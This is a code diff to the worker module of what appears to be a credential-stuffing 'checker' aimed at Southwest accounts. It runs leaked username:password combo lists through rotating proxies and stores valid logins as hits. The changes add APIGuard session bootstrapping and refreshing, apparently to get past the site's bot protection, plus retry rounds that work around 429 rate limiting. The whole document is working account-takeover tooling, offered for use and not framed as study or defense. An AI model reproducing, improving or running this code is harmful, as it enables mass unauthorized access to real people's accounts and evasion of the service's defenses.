@@ -8,7 +8,14 @@ from pathlib import Path
 from typing import Any, Iterable
 
 from southwest_checker.checker import parse_combo
-from southwest_checker.web_adapter import _UNSET, check_account, parse_proxy_lines
+from southwest_checker.web_adapter import (
+    _UNSET,
+    check_account,
+    parse_proxy_lines,
+    prewarm_apiguard,
+    refresh_apiguard,
+    reset_runtime_state,
+)
 
 from .combo_store import iter_nonempty_lines
 from .db import FINAL_STATUSES, combo_key, get_checked_keys, insert_hit, mark_combo_checked
@@ -36,6 +43,7 @@ class JobStats:
 class CheckerWorker:
     def __init__(self) -> None:
         self._lock = threading.Lock()
+        self._start_lock = threading.Lock()
         self._thread: threading.Thread | None = None
         self.stats = JobStats()
 
@@ -51,33 +59,35 @@ class CheckerWorker:
         proxies: list[str],
         threads: int = 5,
     ) -> dict[str, Any]:
-        with self._lock:
-            if self.stats.running or self.stats.preparing:
-                return {"ok": False, "error": "already_running"}
+        with self._start_lock:
+            with self._lock:
+                if self.stats.running or self.stats.preparing:
+                    return {"ok": False, "error": "already_running"}
 
-            if not combo_lines and (combo_file is None or not combo_file.exists()):
-                return {"ok": False, "error": "no_combos"}
+                if not combo_lines and (combo_file is None or not combo_file.exists()):
+                    return {"ok": False, "error": "no_combos"}
 
-            parsed_proxies, invalid_proxies = parse_proxy_lines(proxies)
-            prep_logs = ["Preparing combo list..."]
-            if invalid_proxies:
-                prep_logs.append(
-                    f"Skipped {len(invalid_proxies)} invalid proxy line(s) — use host:port:user:pass"
+                parsed_proxies, invalid_proxies = parse_proxy_lines(proxies)
+                prep_logs = ["Preparing combo list..."]
+                if invalid_proxies:
+                    prep_logs.append(
+                        f"Skipped {len(invalid_proxies)} invalid proxy line(s) — use host:port:user:pass"
+                    )
+
+                self.stats = JobStats(
+                    running=True,
+                    preparing=True,
+                    logs=prep_logs,
                 )
 
-            self.stats = JobStats(
-                running=True,
-                preparing=True,
-                logs=prep_logs,
+            reset_runtime_state()
+            self._thread = threading.Thread(
+                target=self._prepare_and_run,
+                args=(combo_lines, combo_file, parsed_proxies, max(1, threads)),
+                daemon=True,
             )
-
-        self._thread = threading.Thread(
-            target=self._prepare_and_run,
-            args=(combo_lines, combo_file, parsed_proxies, max(1, threads)),
-            daemon=True,
-        )
-        self._thread.start()
-        return {"ok": True, "status": "preparing"}
+            self._thread.start()
+            return {"ok": True, "status": "preparing"}
 
     def stop(self) -> None:
         with self._lock:
@@ -196,6 +206,13 @@ class CheckerWorker:
                 self._log("All combos already checked — nothing to do")
                 return
 
+            self._log("Bootstrapping APIGuard session(s)...")
+            try:
+                prewarm_apiguard(proxies)
+                self._log("APIGuard ready")
+            except Exception as exc:
+                self._log(f"WARNING | APIGuard bootstrap failed: {exc}")
+
             with self._lock:
                 self.stats.started_at = time.time()
 
@@ -208,18 +225,31 @@ class CheckerWorker:
             self._log(f"ERROR | job prep failed | {exc}")
 
     def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
-        del index
         if not proxies:
             return None
         if len(proxies) == 1:
             return proxies[0]
-        return random.choice(proxies)
+        return proxies[index % len(proxies)]
 
-    def _record_result(self, username: str, password: str, result) -> None:
+    def _record_result(
+        self,
+        username: str,
+        password: str,
+        result,
+        retry_queue: list[tuple[str, str]],
+    ) -> None:
+        status = result.status.lower()
+
+        if result.status == "RETRY":
+            retry_queue.append((username, password))
+            with self._lock:
+                self.stats.retries += 1
+            self._log(result.format_line())
+            return
+
         with self._lock:
             self.stats.checked += 1
 
-        status = result.status.lower()
         if status in FINAL_STATUSES:
             mark_combo_checked(username, password, status)
 
@@ -234,11 +264,9 @@ class CheckerWorker:
         elif result.status == "BAD":
             with self._lock:
                 self.stats.bads += 1
-            self._log(result.format_line())
-        elif result.status == "RETRY":
-            with self._lock:
-                self.stats.retries += 1
-            self._log(result.format_line())
+                count = self.stats.bads
+            if count <= 5 or count % 100 == 0:
+                self._log(result.format_line())
         else:
             with self._lock:
                 self.stats.errors += 1
@@ -252,67 +280,102 @@ class CheckerWorker:
     ) -> None:
         from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
 
-        combo_iter = iter(enumerate(combos))
-        inflight: dict = {}
-        max_inflight = max(threads * 2, threads)
+        pending = list(combos)
+        retry_queue: list[tuple[str, str]] = []
+        retry_round = 0
+        max_retry_rounds = 2
 
-        def task(idx: int, username: str, password: str):
+        while pending:
             with self._lock:
                 if self.stats.stop_requested:
-                    return None
-                self.stats.current = username
+                    break
 
-            proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
-            return check_account(username, password, proxy=proxy, timeout=60)
+            combo_iter = iter(enumerate(pending))
+            inflight: dict = {}
+            max_inflight = threads
 
-        def submit_next(pool) -> bool:
-            with self._lock:
-                if self.stats.stop_requested:
+            def task(idx: int, username: str, password: str):
+                with self._lock:
+                    if self.stats.stop_requested:
+                        return None
+                    self.stats.current = username
+
+                proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
+                return check_account(username, password, proxy=proxy, timeout=60)
+
+            def submit_next(pool) -> bool:
+                with self._lock:
+                    if self.stats.stop_requested:
+                        return False
+                try:
+                    idx, (username, password) = next(combo_iter)
+                except StopIteration:
                     return False
+                future = pool.submit(task, idx, username, password)
+                inflight[future] = (username, password)
+                return True
+
             try:
-                idx, (username, password) = next(combo_iter)
-            except StopIteration:
-                return False
-            future = pool.submit(task, idx, username, password)
-            inflight[future] = (username, password)
-            return True
-
-        try:
-            with ThreadPoolExecutor(max_workers=threads) as pool:
-                for _ in range(min(max_inflight, len(combos))):
-                    if not submit_next(pool):
-                        break
-
-                while inflight:
-                    done, _ = wait(inflight, return_when=FIRST_COMPLETED)
-                    for future in done:
-                        username, password = inflight.pop(future)
-                        try:
-                            result = future.result()
-                        except Exception as exc:
-                            with self._lock:
-                                self.stats.checked += 1
-                                self.stats.errors += 1
-                            self._log(f"ERROR | {username} | {exc}")
-                        else:
-                            if result is not None:
-                                self._record_result(username, password, result)
-
-                        submit_next(pool)
-
-                    with self._lock:
-                        if self.stats.stop_requested:
-                            for pending in inflight:
-                                pending.cancel()
-                            inflight.clear()
+                with ThreadPoolExecutor(max_workers=threads) as pool:
+                    for _ in range(min(max_inflight, len(pending))):
+                        if not submit_next(pool):
                             break
-        finally:
-            with self._lock:
-                self.stats.running = False
-                self.stats.preparing = False
-                self.stats.stop_requested = False
-                self.stats.current = ""
-            self._log("Job finished")
+
+                    while inflight:
+                        done, _ = wait(inflight, return_when=FIRST_COMPLETED)
+                        for future in done:
+                            username, password = inflight.pop(future)
+                            try:
+                                result = future.result()
+                            except Exception as exc:
+                                with self._lock:
+                                    self.stats.checked += 1
+                                    self.stats.errors += 1
+                                self._log(f"ERROR | {username} | {exc}")
+                            else:
+                                if result is not None:
+                                    self._record_result(
+                                        username, password, result, retry_queue
+                                    )
+
+                            submit_next(pool)
+
+                        with self._lock:
+                            if self.stats.stop_requested:
+                                for pending_future in inflight:
+                                    pending_future.cancel()
+                                inflight.clear()
+                                break
+            except Exception as exc:
+                self._log(f"ERROR | worker pool failed | {exc}")
+
+            if not retry_queue or retry_round >= max_retry_rounds:
+                break
+
+            retry_round += 1
+            pending = retry_queue
+            retry_queue = []
+            self._log(
+                f"Retry round {retry_round}/{max_retry_rounds} — "
+                f"{len(pending):,} combo(s) after 429/backoff"
+            )
+            try:
+                refresh_apiguard()
+            except Exception as exc:
+                self._log(f"WARNING | APIGuard refresh failed: {exc}")
+            time.sleep(min(3.0 * retry_round, 10.0))
+
+        with self._lock:
+            self.stats.running = False
+            self.stats.preparing = False
+            self.stats.stop_requested = False
+            self.stats.current = ""
+        if retry_queue:
+            self._log(
+                f"Stopped with {len(retry_queue):,} retry combo(s) left — "
+                "run again to continue"
+            )
+        self._log("Job finished")
 
 
 worker = CheckerWorker()
